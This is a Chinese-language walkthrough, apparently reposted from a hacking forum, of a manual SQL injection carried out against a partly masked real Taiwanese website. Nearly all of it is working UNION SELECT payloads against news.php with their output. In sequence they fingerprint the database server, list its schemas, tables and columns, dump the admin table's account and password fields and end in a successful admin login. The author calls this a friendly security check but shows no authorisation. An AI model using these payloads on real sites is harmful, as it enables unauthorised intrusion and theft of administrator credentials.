
# 一次手动 php 注入全程

> 原文：[`www.pediy.com/kssd/pediy12/125627.html`](https://www.pediy.com/kssd/pediy12/125627.html)

作者：天下黑客联盟菜菜

论坛：http://www.txhack.com/

本次注入只是友情检测，联盟菜菜宣传黑客联盟，宣传网络安全，希望每个人都提高安全意识，打造安全的网站环境...技术本身没有对错，希望略懂技术的人不要做恶搞网站，学习一下即可!

现将检测过程写在如下：

`http://www.***.com.tw/news.php?id=-30+union+select+1,2,concat_ws(0x3A,user(),database(),version(),@@basedir,@@datadir),4,5`

`metroasis@localhost`:

`metroasis`:

`5.1.41-3ubuntu12`:

`/usr/`:

`/var/lib/mysql/` 

## 查看数据库列表

`http://www.***.com.tw/news.php?id=-30+union+select+1,2,group_concat(schema_name),4,5/**/from/**/information_schema.schemata`

`information_schema,metroasis`

`http://www.***.com.tw/news.php?id=-30+union+select+1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema='metroasis'`

`about,admin,banner,blockip,brand,catalog,common,contact,context,formdata`

`http://www.***.com.tw/news.php?id=-30+union+select+1,2,group_concat(column_name),4,5 from information_schema.columns where table_name='admin'`

`id,account,passwd`

`http://www.***.com.tw/news.php?id=-30+union+select+1,2,group_concat(account,0x3a,passwd),4,5 from admin`

`http://www.***.com.tw/admin` 登录成功
